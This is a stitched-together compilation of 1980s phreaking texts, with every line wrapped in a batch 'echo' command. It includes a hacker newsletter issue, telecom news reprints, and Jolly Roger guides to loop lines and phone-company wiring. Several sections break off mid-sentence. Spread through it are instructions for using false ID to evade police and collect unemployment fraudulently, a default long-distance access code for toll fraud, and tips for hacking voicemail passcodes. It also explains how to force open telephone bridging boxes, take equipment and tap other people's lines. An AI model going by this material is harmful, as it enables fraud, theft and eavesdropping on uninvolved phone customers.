echo So kiddies, you got ID for buying booze, but what else? In some towns (the larger the more likely) the cops if they catch you for something 
echo petty like shoplifting stuff under a certain dollar amount, will just give you a ticket, same thing for pissing in the street. That's it No fingerprints or 
echo nothing, just pay the fine (almost always over $100) or appear in court. Of course they run a radio check on your ID, you'll be clean and your 
echo alter-ego gets a blot on his record. Your free and clear. That's worth the price of the trouble you've gone through right there. If your smart, 
echo you'll toss that ID away if this happens, or better yet, tear off your picture and give the ID to someone you don't like, maybe they'll get busted 
echo with it. If you're a working stiff, here's a way to stretch your dollar. Go to work for as long as it takes to get unemployment and then get 
echo yourself fired. Go to work under the other name while your getting the unemployment. With a couple of sets of ID, you can live like a king. 
echo These concepts for survival in the new age come to you compliments of THE WALKING GLITCH.

echo Raggers and Braggers
echo This section is to make you aware of well-known raggers and braggers. Since this is the first time this section is being printed, we will tell 
echo you what classifies people as raggers and braggers. In the future issues the top raggers and braggers will be listed in this newsletter to let 
echo the SysOps know who not to let on their board, or to atleast keep an eye on. A ragger is someone who will put someone else down for 
echo something. The person might post a message asking a novice question about hacking and phreaking, or may say something that is 
echo completely wrong, and a ragger will put the other person down for he said, posted, etc. The ones that usually classify in this category are 
echo the ones that think they know it all and consider themselves right no matter what anyone says. Most of the users that use codes and 
echo consider themselves a master phreaker usually become raggers.
echo A bragger is someone who either does or thinks he does know everything, and puts it upon himself to tell the whole world that he knows it 
echo all. This person is also one who thinks he is better than everyone else and he believes he is Elite, and no one else is. People who tend to 
echo do this are those who have, for some reason, become well-known in the underworld, and as a result become a bragger. Those usually not 
echo too well-known will not tend to brag as much as those who think everyone would love to be their friend and be like them.
echo As a well-known ragger and bragger, The Toad, learned that it does not help to be one or both of those. He has since changed and is now 
echo easily accepted by most. Most people disliked him because others they knew had said something bad about him. This is called peer 
echo pressure and is a bad influence to those who are new to the underworld. I would suggest in the future, to not judge someone by what others 
echo say, but rather by how they act around/to you. The current most popular Atarian that classifies as a ragger and a bragger is Ace of Aces, 
echo and is well-hated by many users and SysOps, since he tends to put down anything anyone says and considers himself the best at writing 
echo hacking programs. He is commonly referred to as Ass of Asses and Ass of Assholes. Even holding an open mind about this guy, you would 
echo soon come to find that what others said coincides with what you see from him.
echo A New 950 has arrived
echo LDDS, who as mentioned above bought out TMC, is installing a new 950 port to most major cities. By the time you read this, it should be in 
echo almost every area that supports 950 ports. The number is 950-1450. This port will dial 976 numbers, but not 700, 800, or 900 numbers. The 
echo dialing method for LDDS is: 7 digit code, then even if the code is bad it will give you a dial tone. Then dial the area code plus the number. If 
echo you have a bad code it will simply say your call cannot be completed as it was dialed. There is a default code used on the system that 
echo currently works. The code is simply, 1234567. I have seen codes from 5 different companies and they all are in the format of 00xxxxx. I do 
echo not know what type of software they use, but I will know by the next issue exactly what they place on the bills. This could be the 
echo answer to a lot of people's problems with fear of Sprint and ITT, especially AllNets. Just remember, Tracker is the one who found this, 
echo and all information about it. If someone is seen saying they found this, then they will be listed in the next issue which will contain an article 
echo on leeches.
echo Mailbox Systems
echo Mailbox systems are the link between information and the underworld. If you have ever called one, then you will know the advantages of 
echo having one, especially the ones that are open to whole underworld, rather than just a select few. There are two types of mailbox systems 
echo that are widely used. The first type we will talk about is the multiple mailbox systems, or commonly referred to as message systems. 
echo These systems have several mailboxes set up on one number. Usually, you can access other mailboxes from that number by pressing '*' 
echo or '#'. Sometimes you just enter the mailbox number and you are connected. These are the safest systems to use to protect information from 
echo US Sprint and other long distance companies. Since US Sprint and other companies call the destination numbers, it is safer to have 800 
echo mailbox systems, and most of the time, the multiple mailbox systems are on 800 numbers. The passcode on these systems can vary in 
echo length and can be accessed by several different methods, so it is impossible to explain exactly how to hack these systems.
echo The other type is the single mailbox system. These are usually set up in a reserved prefix in an area code. (Ex: 713-684-6xxx) These 
echo systems are usually controlled by the same type of hardware/software. To access the area where you enter the passcode, just hit '0' for 
echo a second or so. The passcodes are four (4) digits long. The only way to hack these is manually. The best thing you could do is to find one 
echo that does not have a recording from a person, but just the digitized voice. If you hack one that someone already owns, they will report it 
echo and it will not last as long.
echo  Here is a list mailboxes or prefixes to help you get started

echo 90. Remote Informer Issue #3 by Tracker, Ye Cap'n, Norman Bates
echo Introduction
echo It's been a month now, and A LOT has happened. So much, in fact, that the information will be split into several issues. This should be no 
echo shock since I mentioned in the first issue that we may put several issues out sometimes. I want to congratulate the readers for finally 
echo contributing to the newsletter. This first two issues were all on information that I, myself, obtained. Several people gave me information for 
echo these issues, and their handle and information is included in the articles.
echo ITT has 9 digits
echo For those of you who did not know this, ITT has nine digit codes. They are said to give better connections to some extent. This info was 
echo originally given to us by Party Beast. 
echo Phreaky Phones Go Down
echo The famed Phreaky Phones are down again. Modem Man, the original person that started them, has said that they will be down until further 
echo notice. In the meantime, other independent boxes are being started. A listing can be made of current ones on request.
echo Magnus Adept Gets Busted
echo Fellow Atarian and well-known phreak Magnus Adept got caught by MCI. Details of the how, when, and where are not known at this time. He 
echo got caught with 150 codes and may have to pay up to 50 dollars for each code.
echo Sprint Codes Are Dying Fast
echo Sprint codes are hard to get and when they are obtained, they tend to die rather quickly. Phreakers have been saying that the 950-0777 port 
echo is dead, but on the contrary, it is still available in states that are not highly abused by phreaks. Here again, rumors are being spread.
echo The Best BBS of the Month
echo Starting from now on, we will have a BBS of the month. We will choose a BBS, regardless of computer type, and look at the user participation
echo in phreak related matters, as well as quality discussions on the various illegal topics. A BBS can remain the BBS of the month as long as they 
echo reside above the rest of the BBS systems. Even though we will sometimes bring out more than one issue in a month, the board will remain 
echo BBS of the month until the first issue in the next month comes out.
echo This month's BBS of the month is FBI PirateNet. We chose this board because of the large numbers of posts in the bases, and not only 
echo information, but discussions as well, with a minimum number of posts from raggers and braggers. The number for it is 516 -661-7360. The 
echo Sysop of FBI PirateNet is The Phantom, not to be confused with an earlier NARC.
echo US Sprint Expected to Trim Staff, Consolidate Divisions
echo New York -- US Sprint Communications Corp., the troubled long distance carrier, is expected to announce soon that it will cut its work force by 
echo several hundred people and reduce its seven regional divisions to 3 operating groups, sources familiar with the company said.
echo The company's Pacific division is based in Burlingame, CA. The layoffs and reorganization are part of a plan by US Sprint's new president, 
echo Robert H. Snedaker, to reduce heavy operating losses, which analysts expect to reach more than $800 million this year.
echo Snedaker replaced Charles M. Slibo, who was forced to resign in July because losses were running much higher than the parent companies 
echo had expected. Problems with the company's computerized billing system also contributed to Skibo's ouster. US Sprint is owned and operated 
echo by the GTE Corp. and United TeleCom.
echo According to sources close to Snedaker, who was vice chairman and chief operating officer of United TeleCom, he is planning to consolidate 
echo the company's 7 divisions, which operate in the same geographical regions as the seven regional Bell operating companies, into 3 divisions.
echo The rationale for the move, according to industry analysts, is that the company will need a much smaller work force once it begins handling all 
echo it's phone traffic on it's new fiber optic network, which can carry a greater number of telephone calls at less cost. Company officials have 
echo said that they expect to have most of the traffic on the network by early next year. One source said that there would be more than one round 
echo of layoffs in the coming months and that the company ultimately plans to reduce its 14,000 member work force by 15 percent.
echo Several top managers are expected to resign as soon as US Sprint centralizes its marketing and support operations as its headquarters in 
echo Kansas City, MO., according to a report in the latest issue of Business Week magazine.
echo A spokesman for US Sprint said on Friday that the company would not comment on the rumors. The company is the nation's third largest long 
echo distance company, after the American Telephone and Telegraph Co. (ATandT) and MCI Communications Co.
echo Last year, Washington based MCI undertook a similar reorganization in which it posted a $502« million loss to write down old inventory and 
echo restructure operations.
echo Analysts said that is US Sprint is to turn a profit, the company must increase its market share. "To do this, US Sprint must gain more large 
echo business customers, which account for about 80 percent of industry revenues," said Robert B. Morris III, Securities in San Francisco.
echo Morris said that by using a slick marketing campaign to differentiate its all-fiber telephone network from those of competitors, US Sprint more 
echo than doubled its customer base last year. But "most of these customers were residential and small business users that added little to Sprint's 
echo bottom line," he added. "If the company expects to be profitable, it will have to concentrate on providing the best service to volume users."
echo Secret Service Cracks Down on Teen Hackers
echo Mount Lebanon, PA -- The US Secret Service and local police departments have put a scare into the hacker community with a nationwide 
echo crackdown on computer crime that has resulted in the arrests of teenage hackers in at least three cities.
echo "People who monitor the bulletin boards say there are a lot of nervous hackers out there, wondering who will be arrested next," says Ronald 
echo E. Freedman, vice-president of Advanced Information Management, a Woodbridge, VA base computer security firm.
echo Nine teenagers from Mount Lebanon Junior-Senior High School near Pittsburg, PA, were arrested recently and charged with computer fraud. 
echo The juveniles allegedly used home computers to gain illegal access to a credit card authorization center. They obtained valid credit card 
echo numbers and used them to purchase thousands of dollars worth of mail order merchandise, the police said.
echo Freedman says it appears the hackers used some relatively sophisticated techniques in the scheme, including specially written software that 
echo enabled them to bypass security controls and navigate through credit records to obtain key information.
echo Police officials say that the hackers also obtained access codes from pirate bulletin board systems to make free long distance calls and gain 
echo access to various business and government computers.
echo The arrests were the result of a 6 week investigation by the Secret Service and the Mount Lebanon police. The police were tipped off by 
echo parents who were suspicious about how their son managed to obtain a skateboard valued at $140.
echo The Secret Service was also involved in investigations that led to the arrests of several hackers in San Francisco and New York last July.
echo Secret Service spokesman William Corbett says that although some reports have portrayed the hackers as part of a national crime ring, the 
echo cases are unrelated. "It's just that a few of these computers hacking cases came to a head at about the same time," he says.
echo Federal Legislation enacted in 1984 gives the Secret Service, part of the Department of the Treasury, a major role in investigating computer 
echo crimes. Under the federal Computer Fraud and Abuse Act of 1986, computer fraud is a felony that carries a maximum penalty of 5 years for 
echo the first offense, and 10 years for the second. Displaying unauthorized passwords on hacking bulletin boards carries a maximum penalty of 1 
echo year in prison for the first offense, and 10 years for the second.
echo German Teens Crack NASA
echo Washington, D.C. -- A group of West German teenagers from the Chaos Computer Club penetrated a NASA network recently, saying they 
echo were doing it to "test the security."
echo What they got into was SPAN Net, a computer network with about 700 notes, which is actually based at the Goddard Space Center in 
echo Maryland. All that's in there is unclassified data, space science information, and post-flight data analysis. "Anyone with NASA related 
echo research can apply for access to SPAN" says a spokesman, who adds that the network runs on DEC VAX hardware. "We picked up three 
echo attempts to gain access and put in security precautions so it wouldn't happen." His personal opinion is, "We're happy that they couldn't get 
echo back in, and decided to go public." He also added that NASA has many other networks, many of the classified and "probably impenetrable. But I 
echo do not want to challenge anybody."
echo How'd they get in? Probably they got a West German NASA licensee, which gave them a visitor's pass, then they created new passwords 
echo with unlimited security for themselves, after which getting around the network was easy.

echo Switching Systems
echo There are currently three different forms of switching systems that are present in the United States today. Step by Step (SxS), Crossbar, and 
echo the Electronic Switching System (ESS) make up the group. Phreaks have always been a little tentative when it comes to "doing their work" 
echo once they have heard about effects of switching systems on their hobby. After researching this topic, I have found that there really is not that 
echo much to be worried about. Read on, while I share with you information which I have compiled about all of these switching systems and their 
echo distinct features. 
echo The first switching system that was used in the country was called Step by Step. This was adopted in 1918 by Bell, and until 1978, they had 
echo over 53% of all their exchanges using Step by Step (SxS). This system is known for it's long, confusing train of switches that are used for its 
echo step by step switching.
echo Step by Step has many disadvantages to phone users. The switch train becomes jammed fairly often, and it causes calls to be blocked. Also, 
echo SxS does not allow the use of DTMF dialing. This accounts for some of the areas in the United States that cannot have touch tone dialing 
echo abilities. A tremendous amount of electricity and maintenance needs to accompany the SxS switching system, which makes it even more 
echo impratical. All in all, this is probably the most archaic switching system around.
echo There are a number of ways to see if you are on SxS. You will notice that there are no pulsing digits after dialing. Most sources say that the 
echo phone company will sound like many typewriters. SxS does not offer features such as speed calling, call forwarding, three-way calling, call 
echo waiting, and other such services. Pay phones on SxS also will want your money before you receive a dial tone. This adds to the list of 
echo disadvantages labeled to that of the Step by Step switching systems.
echo Another type of switching system that is prevalent in the United States is Crossbar. Crossbar has been Bell's primary switcher after 1960, 
echo and three types of it exists. Number 1 Crossbar (1xB), Number 4 Crossbar (4xB), and the Number 5 Crossbar (5xB). In Crossbar, a switching 
echo matrix is used for all the phones in an area, and when someone calls, the route is determined and is met up with the other phone. This matrix is 
echo set-up in horizontal and vertical paths. Unlike other switching systems, in my research, I could not come up with any true and definite 
echo distinguishing features of the Crossbar switching systems.
echo The Electronic Switching System (ESS) is yet another switching system used in the United States and the most used of all three switching 
echo systems. ESS is an extremely advanced and multi-faced type of switching system, and is feared by marauders of the phone company 
echo everywhere. With ESS, your phone company is able to know every digit dialed (including mistakes), who you call, when you called, and how 
echo long you were connected. ESS is also programmed to print out the numbers of people who make excessive calls to WATS numbers (800 
echo services) or directory assistance. This feature of ESS is called 800 Exceptional Calling Report, and has spelled the end of some forms of 
echo continuous code hacks to certain extenders. ESS can also be programmed to print logs of who called and abused certain numbers as well. 
echo Everything is kept track of in its records.
echo The aforementioned facts show that ESS has made the jobs of organizations such as the FBI, NSA, and other phone company security forces 
echo easier. Tracing can be done in a matter of microseconds, and the result will be conveniently printed out on the monitor of a phone company 
echo officer. ESS is also programmed to pick up any "foreign tones" on the phone line such as the many varied tones emulated by boxes.
echo ESS can be identified by a few features common in it. The 911 emergency service is covered in the later versions of ESS. Also, you are given 
echo the dial tone first when using a pay phone unlike that of SxS. Calling services like call forwarding, speed calling, and call waiting are also 
echo common to ESS. One other feature common to ESS is ANI (Automatic Number Identification) for long distance calls. As you can see, ESS is 
echo basically the zenith of all switching systems, and it will probably plague the entire country by the early 1990's. Soon after, we should be 
echo looking forward to a system called CLASS. This switching system will contain the feature of having the number of the person that is calling 
echo you printed out on your phone.
echo What have I concluded about these switching systems? Well, they are not good enough. I know a few people employed by the phone 
echo company, and I know for a fact that they do not have enough time these days to worry about code users, especially in large, metropolitan 
echo areas. So, I will go out on a limb here, and say that a large portion of people will never have to worry about the horrors of ESS.
echo New Gizmo Can Change Voice Gender
echo The most amazing device has turned up in the new Hammacher Schlemmer catalog: the telephone voice gender changer. What it does is 
echo change the pitch of your voice from, say, soprano to bass -- a most efficient way to dissuade an obscene phone caller just as he's getting 
echo warmed up. That is not the same as running a 45 rpm. record at 33. In digital conversion, the pitch can be changed without altering the speed.
echo The device runs on a 9-volt batter and attaches to the telephone mouth piece with a rubber coupler that takes but a moment to slip on and off. 
echo With the changer switched on, says Lloyd Gray, a Hammacher Schlemmer technical expert, "the effect is similar to what you hear when they 
echo interview an anonymous woman on television and disguise her voice by deepening it." "It's better for changing a woman's voice to a man's 
echo than the other way around," Gray said. A man can use it to raise the pitch of his voice, but he still won't sound like a woman."
echo  
echo A man could, however, use the changer to disguise his voice. But with the device set on high, Gray's voice still could be identified as his own. 
echo On low, his normal tenor became so gravel like that the words were unintelligible.

echo ATandT Rates
echo WASHINGTON -- American Telephone and Telegraph Co. proposed Tuesday to lower its interstate long-distance rates by an average of 3.6% to 
echo reflect reduced costs in connecting to the local telephone network. The largest decrease -- 6.3% -- would be seen in day time prices "Because 
echo of the need to make those rates more competitive," ATandT said.
echo Rates for calls made during evening hours would drop 2.2% and calls made during the late night and weekends would be cut by 0.8%, the 
echo company said. The rate reductions would take effect Jan. 1, if they are approved by the Federal Communications Commission. Reacting to the 
echo proposed price cuts, MCI Communications Corp. and US Sprint Communications Co., the nation's second-largest and third-largest long distance 
echo companies respectively, said their response would depend on what the FCC finally approves but both said they intended to remain competitive 
echo with ATandT. ATandT, the nation's largest long-distance company, proposed to the FCC that its rates drop as much as $800 million, but ATandT said 
echo the exact amount will depend on the access charges the FCC allows the local telephone companies to collect from long distance carriers, 
echo which must pay the fees to hook into the phone local network.
echo ATandT has challenged the new access rates filed by the regional Bell operating companies, contending they are more than $1 billion too high. In 
echo proposing its new rates, the long-distance leader told the FCC it expects local companies' access fees to fall by at least $200 million -- which 
echo would amount to an average rate reduction of less than 1%. But the company said it believes the FCC will order an additional $600 million in 
echo reduc tions based on ATandT's challenge.
echo "We're confident the FCC will recognize that access charges filed by the local telephone companies need to be substantially reduced, which 
echo would mean more savings for our customers," said Larry Garfinkel, ATandT vice president for marketing. He said the company filed its proposed 
echo rates based on disputed charges because "we wanted to let the public react ... and further to let the FCC have full knowledge of where we 
echo were heading given our expectation that we had a valid basis for our dispute."
echo  
echo ATandT's long-distance rates have fallen by about 34% since the company was stripped of its local operating companies by an antitrust decree 
echo nearly four years ago. Since then, phone rate payers have been paying a larger share of the
echo costs of maintaining the local network through monthly subscriber line charges,
echo now $2.60 for residential customers. That has reduced the long-distance companies' share of local network expenses, which they pay in the 
echo form of access charges. Jack Grubman, a telephone analyst with PaineWebber Inc., said ATandT's proposal targets business customers 
echo because "that's where the competition is and where the better (profit) margins are." In addition, it aims to keep the pressure on competition in 
echo international calling by extending discounts to more customers. Grubman added that, if the company's rate proposal is approved by the FCC, he 
echo would expect no further cuts in ATandT rates in 1988. Wendell Lind, ATandT administrator of rates and tariffs, said the cuts for business and 
echo residential customers are about the same because business cuts are offset by a proposed $128 million increase in ATandT's private line rates.
echo ATandT is the only long-distance company whose rates are regulated by the FCC, but its prices set the pace for the industry. Though ATandT is far 
echo larger than any of its competitors, its market share has been declining since divestiture and the company now says it serves about 75 percent 
echo of the market. In addition to the reductions in basic long-distance rates, ATandT proposed cutting prices by 5% and 5.7% for its Pro-America 
echo calling plans. The company also proposed to reduce prices by 2.9 percent for its 800 Service customers and 4.4 percent for WATS customers, 
echo although it would increase the monthly access line charges for those plans by $3.20 to reflect higher special access charges filed by the local 
echo phone companies.
echo US Sprint Operator Service Traffic Increases 40%
echo ORLANDO, Fla. -- US Sprint Wednesday announced its long distance operators who began saying, "May I help you?" just five months ago, are 
echo now handling 3« million calls a month.
echo The fiber-optic long-distance carrier, offering the only operator service alternative to ATandT has experienced a 40 percent growth in operator 
echo service calls since it announced its service July 1. Amanda Weathersby, US Sprint vice president of product marketing, said Tuesday, "More 
echo and more people are taking advantage of our call completion assistance and alternative billing arrangements. "Customer surcharges are the 
echo same as ATandT with the added benefit of US Sprint's fiber-optic quality and lower long-distance rates." US Sprint currently offers person-toperson, station-to-station, call completion and collect calling. US Sprint has announced an agreement with US WEST Service Link that will allow 
echo anyone to call on US Sprint and charge their calls to a Regional Bell Operating Co. calling card beginning in first quarter 1988.
echo "Previously, our operator service was available only on pre-subscribed US Sprint phones and recently we added operator assistance for US 
echo Sprint FON CARD customers," Weathersby said. "With this new agreement, we'll be able to expand our operator service to markets such as 
echo pay phones, hospitals, and hotels/motels." The newest 24-hour operator service center in Dallas began operations on Oct. 5. US Sprint's other 
echo operator service centers are in: Cherry Hill, NJ; Atlanta; Lombard, IL and Reno, NV. US Sprint is a joint venture of United Telecommunications 
echo Inc. of Kansas City, MO and GTE Corp. of Stamford, Conn.
echo Pacific Bell Pursuing Calling Card Thief
echo SAN FRANCISCO--(BW)--Pacific Bell is warning consumers to protect their telephone calling cards like any other credit card in the wake of a 
echo series of frauds by people posing as phone company employees. A Pacific Bell spokesman says customers in the 213, 805 and 916 area 
echo codes are being victimized by someone who says he is a telephone company employee investigating calling card fraud. The individual calls 
echo people at home at odd hours, asking for their calling card numbers. He then sells the numbers to people who use the numbers to make long 
echo distance phone calls.
echo  
echo As recently as Monday of this week, 180 long distance calls were billed to a Sacramento area resident who had given his number to the thief 
echo just three hours earlier. According to Pacific Bell, this kind of scheme and other forms of calling card fraud cost telephone customers 
echo nationwide half a billion dollars a year. The company offered these tips to consumers to avoid becoming a victim
echo of calling card fraud:
echo Never give your calling card number or personal identification number to anyone. Any telephone company employee with a legitimate need to 
echo know the number has access to it. Treat your calling card like any other credit card. Report its loss immediately by calling the 800 number on 
echo the back of the card 800-621-0430. If you receive a suspicious call regarding your telephone calling card, report it by calling the 800 number 
echo on the back of the card. If you receive a call from someone claiming to be a telephone company employee and asking for your calling card 
echo number, ask for a name and number to call back. Then call the local Pacific Bell business office to report the incident.
echo One suspect was arrested in Southern California last week by a quick thinking customer who did just that. Pacific Bell immediately contacted 
echo the local police department. A suspect holding seven stolen calling card numbers was arrested minutes later. Pacific Bell and long-distance

echo 93. The Phreaker's Guide to Loop Lines by The Jolly Roger
echo A loop is a wondrous device which the telephone company created as test numbers for telephone repairmen when testing equipment. By 
echo matching the tone of the equipment with the tone of the loop, repairmen can adjust and test the settings of their telephone equipment. A loop, 
echo basically, consists of two different telephone numbers. Let's use A and B as an example. Normally if you call A, you will hear a loud tone (this 
echo is a 1004 hz tone), and if you call B, the line will connect, and will be followed by silence.
echo This is the format of a loop line. Now, if somebody calls A and someone else calls B--Viola--A and B loop together, and one connection is 
echo made. Ma Bell did this so repairmen can communicate with each other without having to call their own repair office. They can also use them to 
echo exchange programs, like for ANA or Ringback. Also, many CO's have a "Loop Assignment Center". If anyone has any information on these 
echo centers please tell me. Anyway, that is how a loop is constructed. From this information, anyone can find an actual loop line. Going back to the 
echo A and B example, Note: the tone side and the silent side can be either A or B. Don't be fooled if the phone company decides to scramble them 
echo around to be cute. As you now know, loops come in pairs of numbers. Usually, right after each other.
echo For example: 817-972-1890
echo  and
echo  817-972-1891
echo Or, to save space, one loop line can be written as 817-972-1890/1. This is not always true. Sometimes, the pattern is in the tens or hundreds, 
echo and, occasionally, the numbers are random. In cities, usually the phone company has set aside a phone number suffix that loops will be used 
echo for. Many different prefixes will correspond with that one suffix. In Arlington, Texas, a popular suffix for loops is 1893 and 1894, and a lot of 
echo prefixes match with them to make the number.
echo  For Example: 817-460-1893/4
echo  817-461-1893/4
echo  817-465-1893/4
echo  817-467-1893/4
echo  817-469-1893/4
echo  ...are all loops...
echo  or a shorter way to write this is:
echo  817-xxx-1893/4
echo  xxx= 460, 461, 465, 467, 469
echo Note: You can mix -and-match a popular suffix with other prefixes in a city, and almost always find other loops or test numbers.
echo Note: For Houston, the loop suffixes are 1499 and 1799. And for Detroit it's 9996 and 9997. When there are a large number of loops with the 
echo same prefix format, chances are that many loops will be inter-locked. Using the above example of Arlington loops again, (I will write the 
echo prefixes to save space) 460,
echo 461, and 469 are interlocked loops. This means that only one side can be used at
echo a given time. This is because they are all on the same circuit. To clarify, if 817-461-1893 is called, 817-460 and 469-1893 cannot be called 
echo because that circuit is being used. Essentially, interlocked loops are all the same line, but there are a variety of telephone numbers to access 
echo the line.
echo Also, if the operator is asked to break in on a busy loop line he/she will say that the circuit is overloaded, or something along those lines. This 
echo is because Ma Bell has taken the checking equipment off the line. However, there are still many rarely used loops which can be verified and 
echo can have emergency calls taken on them. As you have found out, loops come in many types. Another type of loop is a filtered loop. These are 
echo loop lines that the tel co has put a filter on, so that normal human voices cannot be heard on either line. However, other frequencies may be 
echo heard. It all depends on what the tel co wants the loop to be used for. If a loop has gotten to be very popular with the local population or used 
echo frequently for conferences, etc. the tel co may filter the loop to stop the unwanted "traffic". Usually, the filter will be removed after a few 
echo months, though.

echo 94. How Ma Bell Works by The Jolly Roger
echo In this article, I will first describe the termination, wiring, and terminal hardware most commonly used in the Bell system, and I will include 
echo section on methods of using them.
echo LOCAL NETWORK
echo The local telephone network between the central office/exchange and the telephone subscribers can be briefly described as follows:
echo From the central office (or local exchange) of a certain prefix(es), underground area trunks go to each area that has that prefix (Usually more 
echo than one prefix per area.) At every few streets or tract areas, the underground cables surface. They then go to the telephone pole (or back 
echo underground, depending on the area) and then to the subscribers house (or in the case of an apartment building or mutli-line business, to a 
echo splitter or distribution box/panel). Now that we have the basics, I'll try and go in-depth on the subject.
echo UNDERGROUND CABLES
echo These are sometimes inter-office trunks, but usually in a residential area they are trunk lines that go to bridging heads or distribution cases. The 
echo cables are about 2-3 inches thick (varies), and are either in a metal or pvc-type pipe (or
echo similar). Rarely (maybe not in some remote rural areas) are the cables just 'alone' in the ground. Instead they are usually in an underground 
echo cement tunnel (resembles a small sewer or storm drain.) The manholes are heavy and will say 'Bell system' on them. They can be opened with 
echo a « inch wide crowbar (Hookside) inserted in the top rectangular hole. There are ladder rungs to help you climb down. You will see the cable 
echo pipes on the wall, with the blue and white striped one being the inter-office trunk (at least in my area). The others are local lines, and are 
echo usually marked or color coded. There is almost always a posted color code chart on the wall, not to mention Telco manuals describing the 
echo cables and terminals, so I need not get into detail. Also, there is usually some kind of test equipment, and often Bell test sets are left in there.
echo BRIDGING HEADS
echo The innocent-looking grayish-green boxes. These can be either trunk bridges or bridging for residences. The major trunk bridging heads are 
echo usually larger, and they have the 'Western Electric' logo at the bottom, whereas the normal bridging heads (which may be different in some 
echo areas -depending on the company you are served by. GTE B.H.'s look slightly different. Also, do not be fooled by sprinkler boxes) They can be 
echo found in just about every city. To open a bridging head: if it is locked (and you're feeling destructive), put a hammer or crowbar (the same one 
echo you used on the manhole) in the slot above the top hinge of the right door. Pull hard, and the door will rip off. Very effective If it isn't locked (as 
echo usual), take a 7/8 inch hex socket and with it, turn the bolt about 1/8 of a turn to the right (you should hear a spring release inside). Holding the 
echo bolt, turn the handle all the way to the left and pull out. To Check for a test-set (which are often left by Bell employees), go inside - First check 
echo for a test-set (which are often left by Bell employees). There should be a panel of terminals and wires. Push the panel back about an inch or 
echo so, and rotate the top latch (round with a flat section) downward. Release the panel and it will fall all the way forward. There is usually a 
echo large amount of wire and extra terminals. The test-sets are often hidden here, so don't overlook it (Manuals, as well, are sometimes placed in 
echo the head). On the right door is a metal box of alligator clips. Take a few (Compliments of Bell.). On each door is a useful little round metal 
echo device. (Says 'insert gently' or 'clamp gently - do not overtighten' etc..) On the front of the disc, you should find two terminals. These are for 
echo your test set. (If you don't have one, dont despair - I'll show you ways to make basic test sets later in this article). Hook the ring (-) wire to the 
echo 'r' terminal; and the tip (+) wire to the other. (By the way, an easy way to determine the correct polarity is with a 1«v LED. Tap it to the term. 
echo pair, if it doesn't light, switch the poles until it does. When it lights, find the longer of the two LED poles: This one will be on the tip wire (+). 
echo Behind the disc is a coiled up cord. This should have two alligator clips on it.. Its very useful, because you don't have to keep connecting and 
echo disconnecting the fone (test set) itself, and the clips work nicely. On the terminal board, there should be about 10 screw terminals per side. 
echo Follow the wires, and you can see which cable pairs are active. Hook the clips to the terminal pair, and you're set Dial out if you want, or just 
echo listen (If someone's on the line). Later, I'll show you a way to set up a true 'tap' that will let the person dial out on his line and receive calls as 
echo normal, and you can listen in the whole time. More about this later... On major prefix-area bridging heads, you can see 'local loops', which are 
echo two cable pairs (cable pair = ring+tip, a fone line) that are directly connected to each other on the terminal board. Th ese 'cheap loops' as they 
echo are called, do not work nearly as well as the existing ones set up in the switching hardware at the exchange office. (Try scanning your 
echo prefixes ‘00xx to 99xx #'s.) The tone sides will announce themselves with the 1008 hz loop tone, and the hang side will give no response. The 
echo first person should dial the 'hang' side, and the other person dial the tone side, and the tone should stop if you have got the right loop.) If you 
echo want to find the number of the line that you're on, you can either try to decipher the 'bridging log' (or whatever), which is on the left door. If that 
echo doesn't work, you can use the following:
echo ANI # (Automatic Number ID)
echo This is a Telco test number that reports to you the number that you're calling from (It's the same, choppy 'Bell bitch' voice that you get when you 
echo reach a disconnected number)
echo For the:
echo 213 NPA - Dial 1223
echo 408 NPA - Dial 760
echo 914 NPA - Dial 990
echo These are extremely useful when messing with any kind of line terminals, house boxes, etc. Now that we have bridging heads wired, we can 
echo go on... (don't forget to close and latch the box after all... Wouldn't want GE and Telco people mad, now, would we?)
echo "CANS" - Telephone Distribution Boxes
echo Basically, two types:
echo 1.Large, rectangular silver box at the end of each street.
echo 2.Black, round, or rectangular thing at every telephone pole.
echo Type 1 - This is the case that takes the underground cable from the bridge and runs it to the telephone pole cable (The lowest, largest one on 
echo the telephone pole.) The box is always on the pole nearest the bridging head, where the line comes up. Look for the 'Call before you Dig -
echo Underground cable' stickers.. The case box is hinged, so if you want to climb the pole, you can open it with no problems. These usually have 2 
echo rows of terminal sets. You could try to impersonate a Telco technician and report the number as 'new active' (giving a fake name and fake 
echo report, etc.) I don't recommend this, and it probably won't (almost positively won't) work, but this is basically what Telco linemen do.)
echo Type 2 - This is the splitter box for the group of houses around the pole (Usually 4 or 5 houses). Use it like I mentioned before. The terminals 
echo (8 or so) will be in 2 horizontal rows of sets. The extra wires that are just 'hanging there' are provisions for extra lines to residences (1 extra 
echo line per house, that's why the insane charge for line #3 
echo 'Piggyback' them and wreak havoc on the neighborhood (It's eavesdropping time...) Again, I don't recommend this, and its difficult to do it 
echo correctly. Moving right along...
echo APARTMENT / BUSINESS MULTI-LINE DISTRIBUTION BOXES
echo Found outside the building (most often on the right side, but not always... Just follow the wire from the telephone pole) or in the basement. It 
echo has a terminal for all the lines in the building. Use it just like any other termination box as before. Usually says 'Bell system' or similar. Has up to 
echo 20 terminals on it (usually.) the middle ones are grounds (forget these). The wires come from the cable to one row (usually the left one), with 
echo the other row of terminals for the other row of terminals for the building fone wire pairs. The ring (-) wire is usually the top terminal if the set in 
echo the row (1 of 10 or more), and the tip is
echo in the clamp/screw below it. This can be reversed, but the cable pair is always terminated one-on-top-of-each- other, not on the one next to it. 
echo (I'm not sure why the other one is there, probably as a provision for extra lines) Don't use it though, it is usually to close to the other terminals, 
echo and in my experiences you get a noisy connection.
echo Final note: Almost every apartment, business, hotel, or anywhere there is more than 2 lines this termination lines this termination method is 
echo used. If you can master this type, you can be in control of many things... Look around in your area for a building that uses this type, and 
echo practice hooking up to the line, etc. As an added help, here is the basic 'standard' color-code for multi-line terminals/wiring/etc...
echo Single line: Red = Ring
echo  Green = Tip
echo  Yellow = Ground *
echo  
echo  *Connected to the ringer coil in individual and bridged ringer phones (Bell only) Usually connected to the green (Tip)
echo Ring (-) = Red
echo  White/Red Stripe
echo  Brown
echo  White/Orange Stripe
echo  Black/Yellow Stripe
echo Tip (+) = Green (Sometimes yellow, see above.)
echo  White/Green Stripe
echo  White/Blue Stripe
echo  Blue
echo  Black/White Stripe
echo Ground = Black
echo  Yellow
echo RESIDENCE TERMINAL BOX
echo Small, gray (can be either a rubber (Pacific Telephone) or hard plastic (ATandT) housing deal that connects the cable pair from the splitter box 
echo (See type 2, above) on the pole to your house wiring. Only 2 (or 4, the 2 top terminals are hooked in parallel with the same line) terminals, and 
echo is very easy to use. This can be used to add more lines to your house or add an external line outside the house.
echo TEST SETS
